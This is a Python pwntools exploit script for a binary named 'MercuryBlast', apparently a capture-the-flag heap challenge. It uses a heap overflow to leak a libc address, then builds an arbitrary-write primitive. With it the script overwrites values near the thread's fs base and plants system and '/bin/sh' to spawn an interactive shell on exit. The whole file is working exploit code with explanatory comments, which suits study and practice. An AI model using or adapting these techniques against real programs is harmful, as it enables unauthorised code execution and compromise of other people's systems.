from pwn import * 

binary = "./MercuryBlast"
p = process(binary)
s = '''
b * add_record
b * edit_record+384
b * delete_record
b * print_records
b * menu+128
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)
context.binary = binary

def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")

for i in range(8):
    add_record(0x100, b"a") # chunk_pair 0 - 7. Add 8 records which size > 0x80 to delete later to get unsortedbin
add_record(0x100, b"a")     # chunk_pair 8. Add one more, closest to the Top chunk, prevent merging 
for i in range(8):          
    delete_record(i)        # delete 8 (16) records, first 7 goes to tcachebin, last one is in unsortedbin
add_record(0x100, b"a")     # chunk_pair 0, it was previously chunk_pair 7. Now it is below (at a lower address) chunk_pair 8 

 
payload = flat(
    b"A" * 0x100,
    0,
    0x21,
    0x1,
    0x1000
)
add_record(0x100, b"b")     # chunk_pair 1, it was previously chunk_pair 6, now it is below chunk_pair 0

edit_record(1, 0x200, payload) # buffer goes up to higher address, overwrite chunk_pair 0 which is right above, by overflowing 0x100 byte size with 0x200 of bytes


print_record() # leak the addresses 

# parse the leaked glibc address 
leak = p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00') 
leak = u64(leak)
#print(hex(leak))

libc_base = leak - 0x219ce0
sys_addr = libc_base + libc.sym['system']
fsbase = libc_base + 0x3b8740
fs_neg0x58 = fsbase - 0x58
fs_0x30 = fsbase + 0x30
controllable_addr = libc_base - 0x2aaaa26a8000 + 0x500 # .bss address 
bin_sh_addr = libc_base + 0x1d8698

print(hex(controllable_addr))
def arbitrary_write(addr, target):
    payload = flat(
        b"A" * 0x100,
        0, # metadata
        0x21, # metadata
        0x1, # temperature 
        0x1000, # description size
        addr
    )
    edit_record(1, 0x200, payload)
    edit_record(0, 0x200, target)


arbitrary_write(fs_neg0x58, p64(controllable_addr))
arbitrary_write(fs_0x30, p64(0x0))

arbitrary_write(controllable_addr, p64(sys_addr << 0x11))
gdb.attach(p, s)
arbitrary_write(controllable_addr + 0x8, p64(bin_sh_addr))

payload = flat(
        b"A" * 0x100,
        0, # metadata
        0x21, # metadata
        0x1, # temperature 
        0x1000, # description size
        0
)
edit_record(1, 0x200, payload)
p.sendlineafter("Your choice: ", "0")
#print(hex(libc.address)) # got it
p.interactive()